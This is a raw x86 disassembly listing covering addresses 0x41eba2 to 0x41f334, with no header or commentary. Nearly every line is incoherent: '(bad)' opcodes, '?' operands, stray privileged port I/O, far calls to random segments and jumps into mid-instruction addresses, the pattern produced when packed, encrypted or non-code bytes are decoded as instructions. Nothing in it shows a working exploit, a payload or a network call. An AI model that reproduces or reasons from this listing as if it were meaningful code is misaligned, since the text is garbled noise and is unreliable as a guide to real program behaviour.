  41eba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eba3:	xchg   edi,eax
  41eba4:	mov    edx,0xcdf99831
  41eba9:	test   edx,esp
  41ebab:	push   0x77
  41ebad:	mov    al,0xe0
  41ebaf:	mov    ds:0x69720f84,eax
  41ebb4:	(bad)  
  41ebb5:	and    DWORD PTR [edi],ebp
  41ebb7:	sub    DWORD PTR [esi],ecx
  41ebb9:	jne    0x41ebb3
  41ebbb:	mul    BYTE PTR [eax-0x1f]
  41ebbe:	shl    BYTE PTR [ebx],0xa1
  41ebc1:	popf   
  41ebc2:	dec    ebx
  41ebc3:	call   0xf3ca9b2a
  41ebc8:	and    DWORD PTR [ebx],0x4c
  41ebcb:	xor    DWORD PTR ds:0x1bf3f46,eax
  41ebd1:	int    0x66
  41ebd3:	mov    fs,WORD PTR [ebp+0x4c]
  41ebd6:	dec    ecx
  41ebd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebd8:	sub    edx,DWORD PTR [ebx+0x1e]
  41ebdb:	fucomp st(7)
  41ebdd:	cmp    al,0x23
  41ebdf:	and    BYTE PTR [eax-0x31],ch
  41ebe2:	xor    eax,0x7011a449
  41ebe7:	and    DWORD PTR [eax-0xbcff8d2],edx
  41ebed:	popf   
  41ebee:	outs   dx,DWORD PTR ds:[esi]
  41ebef:	int    0xb5
  41ebf1:	adc    BYTE PTR [esi],cl
  41ebf3:	push   edi
  41ebf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebf5:	mov    dl,0x41
  41ebf7:	aam    0xcb
  41ebf9:	shl    BYTE PTR ds:0x84f64c41,cl
  41ebff:	sahf   
  41ec00:	mov    bh,0xe5
  41ec02:	ret    0xe72
  41ec05:	push   DWORD PTR es:[edi-0x7a248507]
  41ec0c:	sub    eax,DWORD PTR [ebx-0x25]
  41ec0f:	pop    ebp
  41ec10:	test   DWORD PTR [edi],ebp
  41ec12:	ret    0xa3a
  41ec15:	add    al,0x4a
  41ec17:	arpl   WORD PTR es:[eax-0x12ec707d],di
  41ec1e:	call   0xf9de:0x637bdb0c
  41ec25:	or     DWORD PTR [edi],edi
  41ec27:	add    DWORD PTR [ebp-0x79],esi
  41ec2a:	ins    BYTE PTR es:[edi],dx
  41ec2b:	or     BYTE PTR [edx],0xde
  41ec2e:	sub    DWORD PTR [ecx+0xc],edx
  41ec31:	(bad)  
  41ec32:	andnps xmm0,XMMWORD PTR [edi+0x72]
  41ec36:	nop
  41ec37:	lahf   
  41ec38:	sub    DWORD PTR [ebx],esi
  41ec3a:	imul   BYTE PTR [esi+0x7a2b82ac]
  41ec40:	test   dh,al
  41ec42:	mov    DWORD PTR [edi-0x3],ebx
  41ec45:	xchg   esi,eax
  41ec46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec47:	inc    esi
  41ec48:	mov    al,0x6a
  41ec4a:	sub    dh,ah
  41ec4c:	sbb    al,0x67
  41ec4e:	stc    
  41ec4f:	in     al,0xa
  41ec51:	and    DWORD PTR [edx+ebx*4-0x2490d5d],edi
  41ec58:	cs (bad) 
  41ec5a:	pusha  
  41ec5b:	mov    al,0x2e
  41ec5d:	imul   ebx,DWORD PTR [edx+ebp*4],0x1b
  41ec61:	mov    esi,0xdee2de8
  41ec66:	sub    BYTE PTR [eax+edi*1],al
  41ec69:	sti    
  41ec6a:	add    bh,dh
  41ec6c:	outs   dx,BYTE PTR ds:[esi]
  41ec6d:	inc    edi
  41ec6e:	mov    BYTE PTR [esi-0x21],al
  41ec71:	ror    DWORD PTR [ebp-0x6bf9f6b9],cl
  41ec77:	ffreep st(3)
  41ec79:	es cdq 
  41ec7b:	iret   
  41ec7c:	lea    esp,[ebp+0x4d184e05]
  41ec82:	cmp    eax,0x8012dafc
  41ec87:	dec    edi
  41ec88:	xlat   BYTE PTR ds:[ebx]
  41ec89:	jmp    0x41ecf7
  41ec8b:	xchg   BYTE PTR [ebp-0x6ccbfdf6],dh
  41ec91:	or     edi,DWORD PTR [ecx+0x28]
  41ec94:	adc    bh,cl
  41ec96:	(bad)
	...
  41ed12:	add    BYTE PTR [eax],al
  41ed14:	adc    eax,0x773f6240
  41ed19:	aas    
  41ed1a:	pop    ebp
  41ed1b:	push   0xffffff86
  41ed1d:	jb     0x41ed81
  41ed1f:	stc    
  41ed20:	inc    edi
  41ed21:	(bad)  
  41ed22:	cmc    
  41ed23:	call   0x4374c9
  41ed28:	ins    BYTE PTR es:[edi],dx
  41ed29:	pop    es
  41ed2a:	add    BYTE PTR [eax],al
  41ed2c:	dec    ebx
  41ed2d:	repz sub al,0xab
  41ed30:	inc    ebx
  41ed31:	sub    DWORD PTR [ebx],edi
  41ed33:	jo     0x41ed0e
  41ed35:	fbstp  TBYTE PTR [edi-0x2d]
  41ed38:	add    eax,0xcf32812b
  41ed3d:	fs jmp 0x3306adbe
  41ed43:	aam    0x9e
  41ed45:	dec    eax
  41ed46:	test   DWORD PTR [edx],0x4e06f2ca
  41ed4c:	mov    ah,0xb
  41ed4e:	fistp  QWORD PTR [ecx+0x2e]
  41ed51:	inc    eax
  41ed52:	jecxz  0x41edbe
  41ed54:	cs inc edi
  41ed56:	and    BYTE PTR [esi-0x12],0x34
  41ed5a:	mov    ah,0x60
  41ed5c:	inc    esp
  41ed5d:	xchg   ecx,eax
  41ed5e:	cmp    eax,0x6ab1d6f4
  41ed63:	in     al,dx
  41ed64:	dec    esi
  41ed65:	sahf   
  41ed66:	push   ebp
  41ed67:	push   eax
  41ed68:	xor    BYTE PTR ds:0xc41af419,dh
  41ed6e:	(bad)  
  41ed6f:	repz cmp eax,0xb1e25706
  41ed75:	add    ebp,DWORD PTR [ecx+ecx*1]
  41ed78:	mov    bh,BYTE PTR [eax]
  41ed7a:	sar    DWORD PTR [ebx+eax*4-0x69],0x2e
  41ed7f:	push   ecx
  41ed80:	loop   0x41ed4d
  41ed82:	push   edx
  41ed83:	mov    ?,WORD PTR [ebp+esi*1+0xf]
  41ed87:	jb     0x41ed4a
  41ed89:	jns    0x41ed6a
  41ed8b:	inc    eax
  41ed8c:	mov    ch,BYTE PTR [ecx]
  41ed8e:	mov    cl,0xbf
  41ed90:	jge    0x41ee07
  41ed92:	push   esp
  41ed93:	fdiv   DWORD PTR ds:0x50a612cb
  41ed99:	mov    al,ds:0x43093447
  41ed9e:	mov    WORD PTR [edi+0x22],gs
  41eda1:	dec    eax
  41eda2:	push   esp
  41eda3:	fcom   QWORD PTR ds:0x68554eff
  41eda9:	pop    es
  41edaa:	lods   al,BYTE PTR ds:[esi]
  41edab:	push   esi
  41edac:	mov    DWORD PTR [esi+eiz*2],edx
  41edaf:	inc    ecx
  41edb0:	mov    ebx,0xb6db11eb
  41edb5:	jecxz  0x41ee1e
  41edb7:	(bad)  
  41edb8:	dec    ebx
  41edb9:	loop   0x41edb3
  41edbb:	inc    ebx
  41edbc:	fs add al,0x4a
  41edbf:	ins    BYTE PTR es:[edi],dx
  41edc0:	push   ebx
  41edc1:	rcl    DWORD PTR [ebp+0x5c703b50],0x28
  41edc8:	jle    0x41ed51
  41edca:	sbb    al,0xb6
  41edcc:	push   eax
  41edcd:	pop    ebp
  41edce:	jns    0x41ee25
  41edd0:	sub    ebx,esp
  41edd2:	fnsave [ecx-0x61]
  41edd5:	pop    ebx
  41edd6:	add    al,0x0
  41edd8:	xchg   ebp,eax
  41edd9:	inc    edi
  41edda:	adc    eax,0x70d41e55
  41eddf:	scas   eax,DWORD PTR es:[edi]
  41ede0:	sbb    DWORD PTR [eax-0x2d4d701e],ebx
  41ede6:	jl     0x41edf0
  41ede8:	sub    cl,dh
  41edea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edeb:	cmp    eax,0x26b5dd2f
  41edf0:	dec    eax
  41edf1:	fnstcw WORD PTR [edi-0x30d96ba1]
  41edf7:	and    BYTE PTR [ebx-0x13],ch
  41edfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edfb:	inc    ebp
  41edfc:	fistp  WORD PTR [ebp-0x9f1c8d9]
  41ee02:	pop    edx
  41ee03:	popa   
  41ee04:	imul   esp,edi,0x7e
  41ee07:	aas    
  41ee08:	inc    edi
  41ee09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee0a:	inc    edx
  41ee0b:	inc    ebx
  41ee0c:	adc    BYTE PTR [ebx+0x50],bl
  41ee0f:	fwait
  41ee10:	jne    0x41ede2
  41ee12:	in     al,dx
  41ee13:	dec    ecx
  41ee14:	jle    0x41ee42
  41ee16:	push   eax
  41ee17:	iret   
  41ee18:	(bad)  
  41ee19:	xor    BYTE PTR [ecx],dh
  41ee1b:	mov    al,BYTE PTR [ecx+0x77]
  41ee1e:	loope  0x41edbf
  41ee20:	cmp    eax,0xf4787e9
  41ee25:	out    dx,eax
  41ee26:	mov    eax,ds:0x7750b71c
  41ee2b:	rcl    dl,cl
  41ee2d:	je     0x41ee0b
  41ee2f:	jg     0x41edc0
  41ee31:	out    dx,eax
  41ee32:	clc    
  41ee33:	cmp    DWORD PTR [edi-0x6149ac27],esp
  41ee39:	mov    al,ds:0xbe7642
  41ee3e:	outs   dx,BYTE PTR ds:[esi]
  41ee3f:	jle    0x41ee28
  41ee41:	xchg   edx,eax
  41ee42:	pop    ebp
  41ee43:	pop    edx
  41ee44:	mov    ebp,0x35541aee
  41ee49:	mov    ds:0x2cf4d462,eax
  41ee4e:	or     eax,0xa2b84224
  41ee53:	fimul  WORD PTR [eax+edx*2-0x48]
  41ee57:	inc    ebp
  41ee58:	xchg   esi,eax
  41ee59:	popa   
  41ee5a:	dec    ebx
  41ee5b:	push   esp
  41ee5c:	add    al,0x4f
  41ee5e:	xor    BYTE PTR [ecx-0x6e],al
  41ee61:	sub    esi,DWORD PTR [ebx-0x78364a5d]
  41ee67:	fsubp  st(0),st
  41ee69:	es (bad) 
  41ee6b:	not    BYTE PTR [edx-0x11408071]
  41ee71:	cwde   
  41ee72:	idiv   BYTE PTR [esp+ecx*8-0x5a2529b4]
  41ee79:	adc    BYTE PTR [ebp-0x337d9127],bh
  41ee7f:	outs   dx,DWORD PTR ds:[esi]
  41ee80:	fldcw  WORD PTR [eax]
  41ee82:	std    
  41ee83:	ret    
  41ee84:	test   al,0x3a
  41ee86:	out    0x4e,al
  41ee88:	push   ds
  41ee89:	inc    ebp
  41ee8a:	das    
  41ee8b:	pop    ds
  41ee8c:	sub    BYTE PTR [esi],bl
  41ee8e:	or     al,0x23
  41ee90:	(bad)  
  41ee91:	adc    DWORD PTR [ebp-0x75],edx
  41ee94:	jbe    0x41eed4
  41ee96:	or     bh,BYTE PTR [ebx*8+0x77f8dd21]
  41ee9d:	push   ebx
  41ee9e:	test   al,0x82
  41eea0:	daa    
  41eea1:	push   ebx
  41eea2:	xor    al,0xc9
  41eea4:	pop    eax
  41eea5:	arpl   WORD PTR [ebp-0x5ad51c29],sp
  41eeab:	mov    cl,0xc2
  41eead:	test   BYTE PTR [eax+0x44359b51],bh
  41eeb3:	(bad)  
  41eeb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eeb5:	outs   dx,BYTE PTR ds:[esi]
  41eeb6:	aad    0x40
  41eeb8:	mov    esp,0xfabd61ad
  41eebd:	scas   eax,DWORD PTR es:[edi]
  41eebe:	nop
  41eebf:	outs   dx,BYTE PTR ds:[esi]
  41eec0:	and    esi,DWORD PTR [ebp+0xdd4b60f]
  41eec6:	xor    al,0x9c
  41eec8:	xor    ebx,DWORD PTR [edx]
  41eeca:	mov    edx,0x8500d455
  41eecf:	clc    
  41eed0:	jb     0x41ef20
  41eed2:	push   0xffffffe5
  41eed4:	dec    edx
  41eed5:	(bad)  
  41eed6:	pop    esp
  41eed7:	pop    esp
  41eed8:	out    dx,al
  41eed9:	inc    ebx
  41eeda:	sub    ebx,DWORD PTR [ebp+esi*1+0x6b3cc535]
  41eee1:	mov    esi,0x6423fdf6
  41eee6:	or     al,0x66
  41eee8:	mov    edx,es
  41eeea:	sbb    DWORD PTR [eax],esp
  41eeec:	push   ss
  41eeed:	xchg   ebx,eax
  41eeee:	fidiv  WORD PTR [esi-0x1c]
  41eef1:	sub    al,0x43
  41eef3:	je     0x41eeb7
  41eef5:	mov    ds:0x74b94620,eax
  41eefa:	outs   dx,DWORD PTR ds:[esi]
  41eefb:	fmul   st,st(3)
  41eefd:	xchg   BYTE PTR [eax],al
  41eeff:	cs pop ds
  41ef01:	faddp  st(7),st
  41ef03:	jb     0x41ef76
  41ef05:	sbb    bl,dh
  41ef07:	retf   
  41ef08:	dec    ebx
  41ef09:	cmp    eax,0xc6481307
  41ef0e:	push   ecx
  41ef0f:	arpl   cx,ax
  41ef11:	popa   
  41ef12:	mov    ah,0x67
  41ef14:	enter  0xb6ff,0x83
  41ef18:	ret    
  41ef19:	idiv   DWORD PTR [esi-0x2bef302]
  41ef1f:	loopne 0x41eec3
  41ef21:	mov    WORD PTR [ebp-0x33],?
  41ef24:	test   DWORD PTR [ebx-0x4f8dd836],edx
  41ef2a:	or     al,0x45
  41ef2c:	lods   eax,DWORD PTR ds:[esi]
  41ef2d:	xor    DWORD PTR [eax+0x14],esp
  41ef30:	xor    ebx,DWORD PTR [esi]
  41ef32:	sbb    eax,0xe11b9222
  41ef37:	add    dh,ah
  41ef39:	leave  
  41ef3a:	sbb    DWORD PTR [edi],eax
  41ef3c:	aaa    
  41ef3d:	sahf   
  41ef3e:	mov    bl,0xf9
  41ef40:	mov    edx,0xd8833fa2
  41ef45:	ja     0x41eee0
  41ef47:	xchg   DWORD PTR [edx-0x716b1bfe],edx
  41ef4d:	sub    ecx,edi
  41ef4f:	cmc    
  41ef50:	push   0xfffffffa
  41ef52:	xchg   bh,bl
  41ef54:	arpl   WORD PTR [eax+ebx*4+0x1c],dx
  41ef58:	idiv   cl
  41ef5a:	je     0x41efc8
  41ef5c:	mov    al,0x97
  41ef5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef5f:	jge    0x41eef5
  41ef61:	sub    dl,BYTE PTR [ecx+esi*2]
  41ef64:	(bad)  [esi]
  41ef66:	cmp    ecx,DWORD PTR [esi+0x507e945f]
  41ef6c:	cli    
  41ef6d:	test   eax,0x6ee9e6a7
  41ef72:	pushf  
  41ef73:	mov    dh,0xef
  41ef75:	mov    dl,0x7e
  41ef77:	shr    al,1
  41ef79:	mov    WORD PTR [ebx-0x22],?
  41ef7c:	inc    esi
  41ef7d:	sbb    eax,0x891e63e2
  41ef82:	out    dx,al
  41ef83:	stos   BYTE PTR es:[edi],al
  41ef84:	sub    al,0xad
  41ef86:	jg     0x41efb1
  41ef88:	inc    ecx
  41ef89:	pop    edi
  41ef8a:	mov    eax,0x969e8ae0
  41ef8f:	shr    esp,0x5f
  41ef92:	cmp    eax,0xe8fc194d
  41ef97:	cmp    cl,BYTE PTR [edi]
  41ef99:	or     cl,BYTE PTR [ecx+ebx*1+0x762eb0a2]
  41efa0:	stos   BYTE PTR es:[edi],al
  41efa1:	push   esi
  41efa2:	pop    es
  41efa3:	mov    BYTE PTR [edi-0x35],bl
  41efa6:	sub    al,0x8e
  41efa8:	pop    ds
  41efa9:	jns    0x41f001
  41efab:	loop   0x41efc0
  41efad:	adc    al,0x1c
  41efb0:	push   ds
  41efb1:	test   eax,0xe9b35304
  41efb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efb7:	(bad)  
  41efb8:	adc    al,0x57
  41efba:	mov    bl,0xe2
  41efbc:	and    al,0xb1
  41efbe:	mov    bl,0xb0
  41efc0:	(bad)  
  41efc1:	pop    eax
  41efc2:	push   es
  41efc3:	mov    bh,0xea
  41efc5:	jge    0x41efcd
  41efc7:	xchg   BYTE PTR ds:0x748f28a7,bh
  41efcd:	mov    ebx,0xbf45f4b9
  41efd2:	(bad)  
  41efd4:	mov    edi,0xbe8d3942
  41efd9:	pusha  
  41efda:	jp     0x41efd1
  41efdc:	sub    BYTE PTR [eax],0x7b
  41efdf:	dec    edi
  41efe0:	(bad)  
  41efe1:	push   DWORD PTR [eax+0x5b]
  41efe4:	popa   
  41efe5:	jns    0x41f036
  41efe7:	cmp    ah,BYTE PTR [edx+0x5483335]
  41efed:	daa    
  41efee:	dec    esp
  41efef:	and    DWORD PTR [esi+esi*1],ecx
  41eff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eff3:	mov    dh,0x78
  41eff5:	push   edx
  41eff6:	lock jmpw 0xad59
  41effb:	pop    ds
  41effc:	xchg   BYTE PTR [ebp+0x4166253b],cl
  41f002:	sbb    al,0xe8
  41f004:	ret    0xdf0d
  41f007:	out    0xb4,eax
  41f009:	push   es
  41f00a:	mov    ?,WORD PTR [ecx]
  41f00c:	dec    edi
  41f00d:	inc    esp
  41f00e:	add    eax,0x380c504
  41f013:	(bad)  
  41f014:	push   cs
  41f015:	cmp    DWORD PTR [ebx],edx
  41f017:	cli    
  41f018:	mov    WORD PTR [esi-0x31],?
  41f01b:	in     eax,dx
  41f01c:	cmc    
  41f01d:	pop    eax
  41f01e:	mov    esi,0xad707d35
  41f023:	je     0x41f087
  41f025:	mov    ebx,0xa5869205
  41f02a:	or     dh,ah
  41f02c:	retf   
  41f02d:	push   cs
  41f02e:	loopne 0x41f046
  41f030:	mov    ds:0x89e798b9,al
  41f035:	in     eax,dx
  41f036:	ins    BYTE PTR es:[edi],dx
  41f037:	sbb    BYTE PTR [edx-0x671ee2ca],cl
  41f03d:	xor    bh,ch
  41f03f:	jb     0x41f07e
  41f041:	pop    ebp
  41f042:	data16 xor BYTE PTR [edi-0x53],bh
  41f046:	push   es
  41f047:	sub    al,0xd
  41f049:	ja     0x41f045
  41f04b:	rcl    BYTE PTR [ebx-0x3523b2d],1
  41f051:	cmc    
  41f052:	imul   edi,edx,0xffffffc6
  41f055:	arpl   WORD PTR [edi+0xf],bp
  41f058:	inc    edx
  41f059:	add    DWORD PTR [ebx-0x14],ebp
  41f05c:	scas   al,BYTE PTR es:[edi]
  41f05d:	and    eax,0xb9d700b0
  41f062:	jl     0x41f050
  41f064:	fistp  QWORD PTR [edi+0x6eacf2d6]
  41f06a:	lds    ebx,FWORD PTR [ebx-0x20ebd6d4]
  41f070:	push   edi
  41f071:	mov    ah,0x25
  41f073:	sub    DWORD PTR [ebx+eiz*4],ebx
  41f076:	out    0xae,al
  41f078:	retf   0x1aee
  41f07b:	mov    ah,0xe
  41f07d:	jnp    0x41f085
  41f07f:	(bad)  
  41f080:	fwait
  41f081:	jmp    0x41f100
  41f083:	add    al,0xf9
  41f085:	sub    al,0xa9
  41f087:	test   dh,cl
  41f089:	jp     0x41f047
  41f08b:	mul    eax
  41f08d:	stc    
  41f08e:	mov    edx,0x1a0e329
  41f093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f094:	mov    ecx,DWORD PTR [eax-0x2329a358]
  41f09a:	loop   0x41f0bf
  41f09c:	(bad)  
  41f09d:	cmp    eax,0xcc559cee
  41f0a2:	xor    eax,DWORD PTR [esi+0x5c]
  41f0a5:	sub    esi,DWORD PTR [esi+0x62d912c0]
  41f0ab:	dec    eax
  41f0ac:	or     ebp,DWORD PTR ds:0x9127e4cb
  41f0b2:	jecxz  0x41f04f
  41f0b4:	pop    ss
  41f0b5:	add    eax,0x94c70f02
  41f0ba:	fsub   DWORD PTR [edx+0x4bc7139]
  41f0c0:	test   BYTE PTR [esi],cl
  41f0c2:	jle    0x41f0b1
  41f0c4:	or     ah,BYTE PTR [edx+eiz*4]
  41f0c7:	mov    cl,0x94
  41f0c9:	mov    dl,0x9
  41f0cb:	in     eax,dx
  41f0cc:	cld    
  41f0cd:	pop    ds
  41f0ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0cf:	ins    BYTE PTR es:[edi],dx
  41f0d0:	add    esp,edi
  41f0d2:	push   es
  41f0d3:	in     al,0x5f
  41f0d5:	ss inc ecx
  41f0d7:	scas   al,BYTE PTR es:[edi]
  41f0d8:	sub    ah,BYTE PTR [esi+ecx*4+0x69a508d7]
  41f0df:	push   esp
  41f0e0:	dec    ebx
  41f0e1:	in     al,dx
  41f0e2:	(bad)  
  41f0e3:	adc    DWORD PTR [edi-0x65d721b7],ecx
  41f0e9:	dec    ebx
  41f0ea:	retf   0x3b32
  41f0ed:	stos   BYTE PTR es:[edi],al
  41f0ee:	stos   DWORD PTR es:[edi],eax
  41f0ef:	leave  
  41f0f0:	jb     0x41f105
  41f0f2:	dec    esi
  41f0f3:	cwde   
  41f0f4:	push   es
  41f0f5:	sub    eax,0xf1d15287
  41f0fa:	nop
  41f0fb:	daa    
  41f0fc:	xchg   esp,eax
  41f0fd:	sbb    cl,BYTE PTR [esi+0x46a531d3]
  41f103:	lods   al,BYTE PTR ds:[esi]
  41f104:	fs or  cl,0x2a
  41f108:	mov    ah,0xa3
  41f10a:	pop    ds
  41f10b:	retf   0xae40
  41f10e:	fimul  WORD PTR [edi-0x53]
  41f111:	retf   
  41f112:	push   edi
  41f113:	cwde   
  41f114:	into   
  41f115:	in     al,dx
  41f116:	xor    eax,0xc7062e6b
  41f11b:	add    ch,BYTE PTR [ebx-0x7532eb35]
  41f121:	ins    BYTE PTR es:[edi],dx
  41f122:	push   cs
  41f123:	sbb    al,0xeb
  41f125:	push   ebx
  41f126:	jge    0x41f134
  41f128:	dec    ebp
  41f129:	jns    0x41f1a8
  41f12b:	sbb    al,0xa4
  41f12d:	xlat   BYTE PTR ds:[ebx]
  41f12e:	fwait
  41f12f:	push   es
  41f130:	or     dh,BYTE PTR [ebx]
  41f132:	fimul  WORD PTR [ebx+0x3c]
  41f135:	pop    esp
  41f136:	cwde   
  41f137:	mov    ch,0x20
  41f139:	push   0xe0f97a8e
  41f13e:	dec    ebp
  41f13f:	dec    ecx
  41f140:	xor    ah,BYTE PTR [eax+0x1f]
  41f143:	(bad)  
  41f144:	call   0x4a2f617c
  41f149:	push   ds
  41f14a:	adc    BYTE PTR [edi],dh
  41f14c:	cld    
  41f14d:	je     0x41f195
  41f14f:	add    eax,0xb172ca3c
  41f154:	pusha  
  41f155:	div    DWORD PTR [eax]
  41f157:	ror    DWORD PTR [ebx-0x12],1
  41f15a:	push   ds
  41f15b:	xchg   esi,esi
  41f15d:	pop    eax
  41f15e:	loopne 0x41f152
  41f160:	out    0xae,eax
  41f162:	test   edi,ebx
  41f164:	les    ecx,FWORD PTR ds:0x1803c32b
  41f16a:	sbb    eax,0xa5bab5b0
  41f170:	lods   al,BYTE PTR ds:[esi]
  41f171:	mov    edx,0x5fd86048
  41f176:	mov    dl,0xa1
  41f178:	sub    DWORD PTR [eax],ebp
  41f17a:	nop
  41f17b:	sub    BYTE PTR ds:0x72ba65b5,bl
  41f181:	pop    esp
  41f182:	fcmovnbe st,st(1)
  41f184:	cmp    BYTE PTR [eax-0x67c2f146],ah
  41f18a:	xchg   BYTE PTR [ebx+0x53],bl
  41f18d:	xchg   ecx,eax
  41f18e:	xor    DWORD PTR [ecx+0x5a],0x2ab7f07b
  41f195:	sbb    ebx,DWORD PTR [edi-0x76]
  41f198:	call   0x83c9:0x450e9d89
  41f19f:	outs   dx,BYTE PTR ds:[esi]
  41f1a0:	outs   dx,DWORD PTR ds:[esi]
  41f1a1:	adc    al,0xb7
  41f1a3:	aas    
  41f1a4:	inc    esp
  41f1a5:	loopne 0x41f128
  41f1a7:	hlt    
  41f1a8:	jle    0x41f226
  41f1aa:	jne    0x41f1a3
  41f1ac:	fwait
  41f1ad:	xchg   DWORD PTR [edx+ebp*8-0x16],edi
  41f1b1:	fwait
  41f1b2:	jl     0x41f13b
  41f1b4:	imul   ecx,DWORD PTR [edi],0x11
  41f1b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1b8:	arpl   WORD PTR [edx+ebp*2],dx
  41f1bb:	cmp    DWORD PTR [eax+0x18],edi
  41f1be:	xchg   ebx,eax
  41f1bf:	stos   BYTE PTR es:[edi],al
  41f1c0:	pop    edx
  41f1c1:	sub    DWORD PTR [edx-0x159eb80d],ecx
  41f1c7:	(bad)  
  41f1c8:	mov    esp,0xd378b038
  41f1cd:	jnp    0x41f1b1
  41f1cf:	test   al,0xda
  41f1d1:	bnd jmp 0x41f1f1
  41f1d4:	idiv   DWORD PTR [edx-0x16]
  41f1d7:	jecxz  0x41f1de
  41f1d9:	mov    edx,?
  41f1db:	jnp    0x41f193
  41f1dd:	sbb    dl,bl
  41f1df:	test   dl,0xc3
  41f1e2:	mov    ecx,eax
  41f1e4:	imul   ecx,DWORD PTR [edi],0x8e1baa12
  41f1ea:	xchg   BYTE PTR [edi-0x47],dl
  41f1ed:	cmp    al,0xb9
  41f1ef:	frstor [ebx]
  41f1f1:	cmp    DWORD PTR ds:0x5d5027ee,edx
  41f1f7:	(bad)  
  41f1f8:	push   cs
  41f1f9:	or     BYTE PTR [esi-0x4aa0553a],dl
  41f1ff:	or     DWORD PTR [ecx+0x6341a5d1],edi
  41f205:	cdq    
  41f206:	jge    0x41f203
  41f208:	add    al,BYTE PTR [ecx]
  41f20a:	xor    cl,BYTE PTR [edx+0x29]
  41f20d:	pop    ds
  41f20e:	jl     0x41f19e
  41f210:	jecxz  0x41f25a
  41f212:	repnz xchg esp,eax
  41f214:	mov    ch,0x3a
  41f217:	mov    bh,0x32
  41f219:	cmc    
  41f21a:	je     0x41f28a
  41f21c:	jne    0x41f266
  41f21e:	xchg   BYTE PTR [eax-0x6efa64e0],ch
  41f224:	test   eax,0x4c59bc6d
  41f229:	dec    edi
  41f22a:	push   0x1
  41f22c:	inc    eax
  41f22d:	std    
  41f22e:	(bad)  
  41f22f:	(bad)  
  41f230:	sti    
  41f231:	(bad)  
  41f232:	stos   BYTE PTR es:[edi],al
  41f233:	jne    0x41f23f
  41f235:	pop    esi
  41f236:	mov    DWORD PTR [edx],0xf30139c5
  41f23c:	and    DWORD PTR [eax-0x26],eax
  41f23f:	out    0xc7,eax
  41f241:	inc    edi
  41f242:	add    al,0x7d
  41f244:	mov    ch,0xd4
  41f246:	aam    0xe
  41f248:	fldenv [ebx-0x4e427322]
  41f24e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f24f:	int    0xcd
  41f251:	in     al,0x7
  41f253:	jnp    0x41f205
  41f255:	push   cs
  41f256:	sub    BYTE PTR [esi+0x617a4fc],bh
  41f25c:	and    BYTE PTR [edx+0x765676a1],dh
  41f262:	mov    ecx,0xbb628424
  41f267:	dec    eax
  41f268:	add    al,0x54
  41f26a:	icebp  
  41f26b:	pusha  
  41f26c:	ins    BYTE PTR es:[edi],dx
  41f26d:	sub    BYTE PTR fs:[ecx-0x5],0xd3
  41f272:	shr    BYTE PTR [edx],0x57
  41f275:	(bad)  
  41f276:	push   ecx
  41f277:	imul   edx,DWORD PTR ds:0xd12d386b,0x157adb8
  41f281:	pop    eax
  41f282:	xor    DWORD PTR [edi+eiz*4-0x7b592e02],ebx
  41f289:	dec    esp
  41f28a:	inc    eax
  41f28b:	xchg   ebp,eax
  41f28c:	fsubr  DWORD PTR [esi]
  41f28e:	scas   eax,DWORD PTR es:[edi]
  41f28f:	jno    0x41f2e6
  41f291:	(bad)  
  41f292:	les    edi,FWORD PTR [edx-0x7b]
  41f295:	cwde   
  41f296:	fsub   st(7),st
  41f298:	pusha  
  41f299:	mov    eax,0x10e1179b
  41f29e:	mov    ecx,0xddad3a02
  41f2a3:	cli    
  41f2a4:	js     0x41f29d
  41f2a6:	adc    BYTE PTR [eax],bh
  41f2a8:	and    eax,0x112a365c
  41f2ad:	test   al,0x29
  41f2af:	inc    ebp
  41f2b0:	aaa    
  41f2b1:	add    esp,DWORD PTR [eax-0x70]
  41f2b4:	sbb    eax,0x30f5627c
  41f2b9:	add    DWORD PTR [esi+0x20ddef2c],edx
  41f2bf:	and    cl,bl
  41f2c1:	mov    BYTE PTR ss:[ecx+0x72],0xb5
  41f2c6:	adc    eax,0x2b2b2674
  41f2cb:	jo     0x41f2b2
  41f2cd:	jnp    0x41f314
  41f2cf:	int3   
  41f2d0:	loope  0x41f324
  41f2d2:	cmp    al,0x6e
  41f2d4:	mov    dh,BYTE PTR [esi]
  41f2d6:	cmp    al,0xfc
  41f2d8:	stos   DWORD PTR es:[edi],eax
  41f2d9:	xchg   ecx,eax
  41f2da:	fdiv   QWORD PTR [edi]
  41f2dc:	or     eax,0x61fecf1d
  41f2e1:	imul   di,WORD PTR [edi-0x23861a20],0xffc7
  41f2e9:	das    
  41f2ea:	loop   0x41f277
  41f2ec:	imul   ebp,ecx,0x73d3b1e5
  41f2f2:	jle    0x41f34e
  41f2f4:	retf   0x8650
  41f2f7:	imul   esi,DWORD PTR [esi],0x238035a9
  41f2fd:	xchg   ebx,eax
  41f2fe:	fucomi st,st(6)
  41f300:	adc    ah,ch
  41f302:	sub    dl,BYTE PTR [eax-0x71]
  41f305:	fadd   st(3),st
  41f307:	clc    
  41f308:	mov    edx,ds
  41f30a:	push   edx
  41f30b:	jl     0x41f358
  41f30d:	not    al
  41f30f:	push   ss
  41f310:	push   eax
  41f311:	sbb    ebp,ebx
  41f313:	out    0x35,al
  41f315:	ja     0x41f35a
  41f317:	std    
  41f318:	ror    BYTE PTR [eax],cl
  41f31a:	retf   
  41f31b:	jmp    0x41f309
  41f31d:	sbb    edi,DWORD PTR [eax-0x4fe7a534]
  41f323:	xchg   DWORD PTR ds:0xe1f13360,eax
  41f329:	(bad)  
  41f32a:	fucom  st(6)
  41f32c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f32d:	push   0xfffffff2
  41f32f:	or     cl,BYTE PTR [esi+0x77]
  41f332:	jb     0x41f36c
  41f334:	mov    ah,0x89
